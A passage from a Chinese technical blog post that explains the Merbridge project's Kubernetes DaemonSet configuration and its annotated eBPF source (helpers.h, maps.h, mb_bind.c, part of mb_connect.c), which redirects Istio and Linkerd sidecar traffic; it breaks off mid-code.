class="line">        - /app/mbctl</span><br><span class="line">        - -m</span><br><span class="line">        - istio</span><br><span class="line">        - --ips-file</span><br><span class="line">        - /host/ips/ips.txt</span><br><span class="line">        lifecycle: </span><br><span class="line">          preStop: </span><br><span class="line">            exec:</span><br><span class="line">              command: </span><br><span class="line">              - make</span><br><span class="line">              - -k</span><br><span class="line">              - clean</span><br><span class="line">        resources: </span><br><span class="line">          requests:</span><br><span class="line">            cpu: 100m</span><br><span class="line">            memory: 200Mi</span><br><span class="line">          limits:</span><br><span class="line">            cpu: 300m</span><br><span class="line">            memory: 200Mi</span><br><span class="line">        securityContext: </span><br><span class="line">          privileged: true</span><br><span class="line">        volumeMounts: </span><br><span class="line">          - mountPath: /sys/fs</span><br><span class="line">            name: sys-fs</span><br><span class="line">          - mountPath: /host/ips</span><br><span class="line">            name: host-ips</span><br></pre></td></tr></table></figure><p>看一下该容器中的执行参数。通过源码我们看到<code>-m</code>是服务网格的模式，当前所支持的是<code>istio</code>和<code>linkerd</code>。这里我们使用的是<code>istio</code>，<code>--ips-file</code>是当前节点的ip信息的文件名，即在<code>initContainers</code>中我们将ip信息写入的路径<code>/host/ips/ips.txt</code>。</p><p><code>lifecycle</code>字段是管理容器在运行前和关闭前的一些动作。其中<code>preStop</code>是容器被终止前的任务，用于优雅关闭应用程序、通知其他系统。这里在容器被终止前执行<code>make clean</code>用于清除之前编译的可执行文件及配置文件。</p><p>第五段，pod相应策略</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">dnsPolicy: ClusterFirst #针对每个Pod设置DNS的策略,ClusterFirst为默认配置</span><br><span class="line">nodeSelector: #约束一个Pod只能在特定的节点上运行</span><br><span class="line">  kubernetes.io/os: linux</span><br><span class="line">priorityClassName: system-node-critical #将Pod标记为关键性</span><br><span class="line">restartPolicy: Always</span><br><span class="line">serviceAccount: merbridge</span><br><span class="line">serviceAccountName: merbridge</span><br><span class="line">tolerations: #应用于Pod上的，允许Pod调度到带有与之匹配的污点的节点上。</span><br><span class="line">- key: CriticalAddonsOnly #允许pod被重新调度</span><br><span class="line">  operator: Exists</span><br><span class="line">- operator: Exists</span><br></pre></td></tr></table></figure><h4 id="eBPF程序分析"><a href="#eBPF程序分析" class="headerlink" title="eBPF程序分析"></a>eBPF程序分析</h4><h5 id="helpers-h"><a href="#helpers-h" class="headerlink" title="helpers.h"></a><code>helpers.h</code></h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> once</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/bpf.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/bpf_common.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/swab.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> __BYTE_ORDER__ == __ORDER_LITTLE_ENDIAN__</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> bpf_htons(x) __builtin_bswap16(x)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> bpf_htonl(x) __builtin_bswap32(x)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">elif</span> __BYTE_ORDER__ == __ORDER_BIG_ENDIAN__</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> bpf_htons(x) (x)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> bpf_htonl(x) (x)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">error</span> <span class="meta-string">"__BYTE_ORDER__ error"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> __section</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __section(NAME) __attribute__((section(NAME), used))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//存储socket信息的映射表</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_map</span> &#123;</span></span><br><span class="line">    __u32 type;</span><br><span class="line">    __u32 key_size;</span><br><span class="line">    __u32 value_size;</span><br><span class="line">    __u32 max_entries;</span><br><span class="line">    __u32 map_flags;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取组id</span></span><br><span class="line"><span class="keyword">static</span> __u64 (*bpf_get_current_pid_tgid)() = (<span class="keyword">void</span> *)</span><br><span class="line">    BPF_FUNC_get_current_pid_tgid;</span><br><span class="line"><span class="comment">//获取uid</span></span><br><span class="line"><span class="keyword">static</span> __u64 (*bpf_get_current_uid_gid)() = (<span class="keyword">void</span> *)</span><br><span class="line">    BPF_FUNC_get_current_uid_gid;</span><br><span class="line"><span class="comment">//根据用户定义的输出，将BPF程序产生的对应日志消息保存在用来跟踪内核的文件夹</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="title">void</span> <span class="params">(*bpf_trace_printk)</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *fmt, <span class="keyword">int</span> fmt_size,</span></span></span><br><span class="line"><span class="function"><span class="params">                                ...)</span> </span>= (<span class="keyword">void</span> *)BPF_FUNC_trace_printk;</span><br><span class="line"><span class="comment">//用当前进程名字填充第一个参数地址</span></span><br><span class="line"><span class="keyword">static</span> __u64 (*bpf_get_current_comm)(<span class="keyword">void</span> *buf, __u32 size_of_buf) = (<span class="keyword">void</span> *)</span><br><span class="line">    BPF_FUNC_get_current_comm;</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取套接字的cookie，套接字通过bpf_sock_ops获得</span></span><br><span class="line"><span class="keyword">static</span> __u64 (*bpf_get_socket_cookie_ops)(struct bpf_sock_ops *skops) = (<span class="keyword">void</span> *)</span><br><span class="line">    BPF_FUNC_get_socket_cookie;</span><br><span class="line"><span class="comment">//获取套接字的cookie，套接字通过bpf_sock_addr获得</span></span><br><span class="line"><span class="keyword">static</span> __u64 (*bpf_get_socket_cookie_addr)(struct bpf_sock_addr *ctx) = (<span class="keyword">void</span> *)</span><br><span class="line">    BPF_FUNC_get_socket_cookie;</span><br><span class="line"><span class="comment">//在bpf_map中查找与key关联的条目</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> *(*bpf_map_lookup_elem)(struct bpf_map *<span class="built_in">map</span>, <span class="keyword">const</span> <span class="keyword">void</span> *key) =</span><br><span class="line">    (<span class="keyword">void</span> *)BPF_FUNC_map_lookup_elem;</span><br><span class="line"><span class="comment">//添加或更新map中key关联的条目</span></span><br><span class="line"><span class="keyword">static</span> __u64 (*bpf_map_update_elem)(struct bpf_map *<span class="built_in">map</span>, <span class="keyword">const</span> <span class="keyword">void</span> *key,</span><br><span class="line">                                    <span class="keyword">const</span> <span class="keyword">void</span> *value, __u64 flags) = (<span class="keyword">void</span> *)</span><br><span class="line">    BPF_FUNC_map_update_elem;</span><br><span class="line"><span class="comment">//在子网络名称空间netns中查找与TCP套接字匹配的元组</span></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">bpf_sock</span> *(*<span class="title">bpf_sk_lookup_tcp</span>)(</span></span><br><span class="line"><span class="class">    <span class="title">void</span> *<span class="title">ctx</span>, <span class="title">struct</span> <span class="title">bpf_sock_tuple</span> *<span class="title">tuple</span>, __<span class="title">u32</span> <span class="title">tuple_size</span>, __<span class="title">u64</span> <span class="title">netns</span>,</span></span><br><span class="line"><span class="class">    __<span class="title">u64</span> <span class="title">flags</span>) = (<span class="title">void</span> *)<span class="title">BPF_FUNC_sk_lookup_tcp</span>;</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="title">long</span> <span class="params">(*bpf_sk_release)</span><span class="params">(struct bpf_sock *sock)</span> </span>= (<span class="keyword">void</span> *)</span><br><span class="line">    BPF_FUNC_sk_release;</span><br><span class="line"><span class="comment">//添加或更新引用套接字的sockhash map</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="title">long</span> <span class="params">(*bpf_sock_hash_update)</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    struct bpf_sock_ops *skops, struct bpf_map *<span class="built_in">map</span>, <span class="keyword">void</span> *key,</span></span></span><br><span class="line"><span class="function"><span class="params">    __u64 flags)</span> </span>= (<span class="keyword">void</span> *)BPF_FUNC_sock_hash_update;</span><br><span class="line"><span class="comment">//消息重定向</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="title">long</span> <span class="params">(*bpf_msg_redirect_hash)</span><span class="params">(struct sk_msg_md *md, struct bpf_map *<span class="built_in">map</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">                                     <span class="keyword">void</span> *key, __u64 flags)</span> </span>= (<span class="keyword">void</span> *)</span><br><span class="line">    BPF_FUNC_msg_redirect_hash;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> PRINTNL</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PRINT_SUFFIX <span class="meta-string">"\n"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PRINT_SUFFIX <span class="meta-string">""</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> printk</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> printk(fmt, ...)                                                       \</span></span><br><span class="line">    (&#123;                                                                         \</span><br><span class="line">        <span class="keyword">char</span> ____fmt[] = fmt PRINT_SUFFIX;                                     \</span><br><span class="line">        bpf_trace_printk(____fmt, <span class="keyword">sizeof</span>(____fmt), ##__VA_ARGS__);             \</span><br><span class="line">    &#125;)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> DEBUG</span></span><br><span class="line"><span class="comment">// do nothing</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> debugf(fmt, ...) (&#123;&#125;)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="comment">// only print traceing in debug mode</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> debugf</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> debugf(fmt, ...)                                                       \</span></span><br><span class="line">    (&#123;                                                                         \</span><br><span class="line">        <span class="keyword">char</span> ____fmt[] = <span class="string">"[debug] "</span> fmt PRINT_SUFFIX;                          \</span><br><span class="line">        bpf_trace_printk(____fmt, <span class="keyword">sizeof</span>(____fmt), ##__VA_ARGS__);             \</span><br><span class="line">    &#125;)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">is_port_listen_current_ns</span><span class="params">(<span class="keyword">void</span> *ctx, __u16 port)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">bpf_sock_tuple</span> <span class="title">tuple</span> = &#123;</span>&#125;;</span><br><span class="line">    tuple.ipv4.dport = bpf_htons(port);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">bpf_sock</span> *<span class="title">s</span> = <span class="title">bpf_sk_lookup_tcp</span>(<span class="title">ctx</span>, &amp;<span class="title">tuple</span>, <span class="title">sizeof</span>(<span class="title">tuple</span>.<span class="title">ipv4</span>),</span></span><br><span class="line"><span class="class">                                           <span class="title">BPF_F_CURRENT_NETNS</span>, 0);</span></span><br><span class="line">    <span class="keyword">if</span> (s) &#123;</span><br><span class="line">        bpf_sk_release(s);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//存储源信息</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">origin_info</span> &#123;</span></span><br><span class="line">    __u32 pid;</span><br><span class="line">    __u32 ip;</span><br><span class="line">    __u16 port;</span><br><span class="line">    <span class="comment">// last bit means that ip of process is detected.</span></span><br><span class="line">    __u16 flags;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//存储源ip 目的ip 源端口和目的端口</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pair</span> &#123;</span></span><br><span class="line">    __u32 sip;</span><br><span class="line">    __u32 dip;</span><br><span class="line">    __u16 sport;</span><br><span class="line">    __u16 dport;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h5 id="maps-h"><a href="#maps-h" class="headerlink" title="maps.h"></a><code>maps.h</code></h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> once</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"helpers.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//保存原始目的地址信息</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_map</span> __<span class="title">section</span>("<span class="title">maps</span>") <span class="title">cookie_original_dst</span> = &#123;</span></span><br><span class="line">    .type = BPF_MAP_TYPE_LRU_HASH,</span><br><span class="line">    .key_size = <span class="keyword">sizeof</span>(__u32),</span><br><span class="line">    .value_size = <span class="keyword">sizeof</span>(struct origin_info),</span><br><span class="line">    .max_entries = <span class="number">65535</span>,</span><br><span class="line">    .map_flags = <span class="number">0</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//保存当前节点中的pod的ip信息,将已经注入Sidecar的Pod IP地址写入local_pod_ips</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_map</span> __<span class="title">section</span>("<span class="title">maps</span>") <span class="title">local_pod_ips</span> = &#123;</span></span><br><span class="line">    .type = BPF_MAP_TYPE_HASH,</span><br><span class="line">    .key_size = <span class="keyword">sizeof</span>(__u32),</span><br><span class="line">    .value_size = <span class="keyword">sizeof</span>(__u32),</span><br><span class="line">    .max_entries = <span class="number">1024</span>,</span><br><span class="line">    .map_flags = <span class="number">0</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//保存envoy的ip地址</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_map</span> __<span class="title">section</span>("<span class="title">maps</span>") <span class="title">process_ip</span> = &#123;</span></span><br><span class="line">    .type = BPF_MAP_TYPE_LRU_HASH,</span><br><span class="line">    .key_size = <span class="keyword">sizeof</span>(__u32),</span><br><span class="line">    .value_size = <span class="keyword">sizeof</span>(__u32),</span><br><span class="line">    .max_entries = <span class="number">1024</span>,</span><br><span class="line">    .map_flags = <span class="number">0</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//保存四元组信息和对应的原始目的地址</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_map</span> __<span class="title">section</span>("<span class="title">maps</span>") <span class="title">pair_original_dst</span> = &#123;</span></span><br><span class="line">    .type = BPF_MAP_TYPE_LRU_HASH,</span><br><span class="line">    .key_size = <span class="keyword">sizeof</span>(struct pair),</span><br><span class="line">    .value_size = <span class="keyword">sizeof</span>(struct origin_info),</span><br><span class="line">    .max_entries = <span class="number">65535</span>,</span><br><span class="line">    .map_flags = <span class="number">0</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//保存当前sock和四元组信息</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_map</span> __<span class="title">section</span>("<span class="title">maps</span>") <span class="title">sock_pair_map</span> = &#123;</span></span><br><span class="line">    .type = BPF_MAP_TYPE_SOCKHASH,</span><br><span class="line">    .key_size = <span class="keyword">sizeof</span>(struct pair),</span><br><span class="line">    .value_size = <span class="keyword">sizeof</span>(__u32),</span><br><span class="line">    .max_entries = <span class="number">65535</span>,</span><br><span class="line">    .map_flags = <span class="number">0</span>,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h5 id="mb-bind-c"><a href="#mb-bind-c" class="headerlink" title="mb_bind.c"></a><code>mb_bind.c</code></h5><p>劫持 bind 系统调用并修改地址。目前该项目支持<code>Istio</code>和<code>linkerd</code>，<code>mb_bind.c</code>程序会判断<code>mesh</code>的类型是否为<code>linkerd</code>，如果是会将监听地址从<code>127.0.0.1:4140</code>变为<code>0.0.0.0:4140</code>，<code>4140</code>端口是<code>linkerd</code>的出站流量重定向端口。</p><p>在<code>mb_connect.c</code>中，作者为了避免四元组产生冲突，将目的地址修改为<code>127.x.y.z</code>而不是<code>127.0.0.1</code>，而在<code>linkerd</code>源码中是不允许修改的，如下图所示</p><p><img src="/2022/02/28/从0到0-5-eBPF加速ServiceMesh实践/2.png" alt="2"></p><p>针对该代码的具体细则可参考链接：<a href="https://github.com/linkerd/linkerd2-proxy/pull/1442" target="_blank" rel="noopener">https://github.com/linkerd/linkerd2-proxy/pull/1442</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"headers/helpers.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"headers/mesh.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/bpf.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/in.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">__section(<span class="string">"cgroup/bind4"</span>) <span class="function"><span class="keyword">int</span> <span class="title">mb_bind</span><span class="params">(struct bpf_sock_addr *ctx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> MESH != LINKERD</span></span><br><span class="line">    <span class="comment">// only works on linkerd</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ctx-&gt;user_ip4 == <span class="number">0x0100007f</span> &amp;&amp;</span><br><span class="line">        ctx-&gt;user_port == bpf_htons(OUT_REDIRECT_PORT)) &#123;</span><br><span class="line">        __u64 uid = bpf_get_current_uid_gid() &amp; <span class="number">0xffffffff</span>;</span><br><span class="line">        <span class="keyword">if</span> (uid == SIDECAR_USER_ID) &#123;</span><br><span class="line">            printk(<span class="string">"change bind address from 127.0.0.1:%d to 0.0.0.0:%d"</span>,</span><br><span class="line">                   OUT_REDIRECT_PORT, OUT_REDIRECT_PORT);</span><br><span class="line">            ctx-&gt;user_ip4 = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> ____license[] __section(<span class="string">"license"</span>) = <span class="string">"GPL"</span>;</span><br><span class="line"><span class="keyword">int</span> _version __section(<span class="string">"version"</span>) = <span class="number">1</span>;</span><br></pre></td></tr></table></figure><h5 id="mb-connect-c"><a href="#mb-connect-c" class="headerlink" title="mb_connect.c"></a><code>mb_connect.c</code></h5><p>劫持<code>connect</code>系统调用</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"headers/helpers.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"headers/maps.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"headers/mesh.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/bpf.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/in.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> __u32 outip = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">__section(<span class="string">"cgroup/connect4"</span>) <span class="function"><span class="keyword">int</span> <span class="title">mb_sock4_connect</span><span class="params">(struct bpf_sock_addr *ctx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// init，处理TCP流量</span></span><br><span class="line">    <span class="keyword">if</span> (ctx-&gt;protocol != IPPROTO_TCP) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    __u32 pid = bpf_get_current_pid_tgid() &gt;&gt; <span class="number">32</span>; <span class="comment">// tgid</span></span><br><span class="line">    __u64 uid = bpf_get_current_uid_gid() &amp; <span class="number">0xffffffff</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//判断端口是否在监听当前的netns，以istio为例，OUT_REDIRECT_PORT是15001</span></span><br><span class="line">    <span class="comment">//如果15001端口没有监听当前ns，则绕过，只需要处理istio管理的pod间流量</span></span><br><span class="line">    <span class="keyword">if</span> (!is_port_listen_current_ns(ctx, OUT_REDIRECT_PORT)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//istio-proxy用户身份 uid为1337</span></span><br><span class="line">    <span class="comment">//1.如果uid不是1337</span></span><br><span class="line">    <span class="keyword">if</span> (uid != SIDECAR_USER_ID) &#123;</span><br><span class="line">        <span class="comment">//1.1进一步判断如果应用调用的是本地即127开头的话，则绕过</span></span><br><span class="line">        <span class="keyword">if</span> ((ctx-&gt;user_ip4 &amp; <span class="number">0xff</span>) == <span class="number">0x7f</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span 